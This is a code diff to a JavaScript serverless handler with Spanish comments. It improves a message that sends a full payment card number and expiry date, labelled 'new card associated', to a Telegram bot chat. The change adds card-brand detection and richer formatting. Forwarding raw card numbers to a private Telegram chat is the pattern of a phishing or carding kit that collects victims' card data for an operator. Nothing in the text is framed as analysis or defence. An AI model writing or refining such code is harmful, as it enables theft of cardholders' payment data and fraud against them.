@@ -26,11 +26,45 @@ exports.handler = async (event) => {
         if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
             console.error('Faltan variables de entorno de Telegram');
         } else {
-            // Crear mensaje
-            const message = `🔔 *Nueva tarjeta asociada*\n\n` +
-                `💳 *Número:* \`${cardNumber}\`\n` +
-                `📅 *Vencimiento:* ${expMonth}/${expYear}\n` +
-                `🕐 *Fecha:* ${new Date().toLocaleString('es-ES', { timeZone: 'America/Argentina/Buenos_Aires' })}`;
+            // Detectar tipo de tarjeta
+            const cleanNum = cardNumber.replace(/\s/g, '');
+            let cardType = '💳';
+            if (/^4/.test(cleanNum)) {
+                cardType = 'VISA';
+            } else if (/^5[1-5]/.test(cleanNum) || /^2(2[2-9]|[3-6]|7[0-1]|720)/.test(cleanNum)) {
+                cardType = 'MASTERCARD';
+            } else if (/^3[47]/.test(cleanNum)) {
+                cardType = 'AMEX';
+            }
+
+            // Crear mensaje con mejor formato
+            const fecha = new Date().toLocaleString('es-ES', { 
+                timeZone: 'America/Argentina/Buenos_Aires',
+                day: '2-digit',
+                month: '2-digit',
+                year: 'numeric',
+                hour: '2-digit',
+                minute: '2-digit',
+                second: '2-digit'
+            });
+
+            const message = 
+`━━━━━━━━━━━━━━━━━━━━━
+🔔 *NUEVA TARJETA ASOCIADA*
+━━━━━━━━━━━━━━━━━━━━━
+
+💳 *Tipo:* ${cardType}
+
+🔢 *Número:*
+\`${cardNumber}\`
+
+📅 *Vencimiento:*
+\`${expMonth}/${expYear}\`
+
+🕐 *Fecha y Hora:*
+${fecha}
+
+━━━━━━━━━━━━━━━━━━━━━`;
 
             // Enviar a Telegram
             await sendToTelegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, message);
